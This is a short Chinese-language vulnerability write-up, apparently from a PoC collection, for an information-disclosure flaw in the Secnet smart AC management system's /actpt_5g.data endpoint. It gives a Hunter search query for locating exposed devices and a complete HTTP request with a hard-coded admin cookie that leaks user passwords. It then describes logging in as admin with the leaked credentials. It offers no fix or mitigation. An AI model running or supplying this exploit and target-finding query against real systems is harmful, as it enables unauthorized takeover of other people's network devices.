# Secnet安网 智能AC管理系统 actpt_5g 信息泄露

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">Secnet安网 智能AC管理系统 actpt_5g 接口存在信息泄露漏洞，可获取用户密码信息。</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgb(51, 51, 51);">Secnet安网 智能AC管理系统 </font>

# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
+ hunter`web.title="安网-智能路由系统"`
+ 特征

![1702369576891-35aff956-fbea-4f67-b05b-466200f5fcb3.png](./img/QmDYfQBL_bI9V4Jq/1702369576891-35aff956-fbea-4f67-b05b-466200f5fcb3-113410.png)

# 四、漏洞复现
```plain
GET /actpt_5g.data HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ac_userid=admin,ac_passwd=70076EA6CDE654631A639018D9E23BC5
Upgrade-Insecure-Requests: 1
```

![1702369649483-f28655d2-e6c6-42f2-adf9-8c9b831c2cfe.png](./img/QmDYfQBL_bI9V4Jq/1702369649483-f28655d2-e6c6-42f2-adf9-8c9b831c2cfe-436141.png)使用泄露的账号密码`admin/admin`登录系统

![1702369681603-6e0bff32-6015-4fee-834e-c17072637574.png](./img/QmDYfQBL_bI9V4Jq/1702369681603-6e0bff32-6015-4fee-834e-c17072637574-749568.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gaq5fqcqle5ez69e>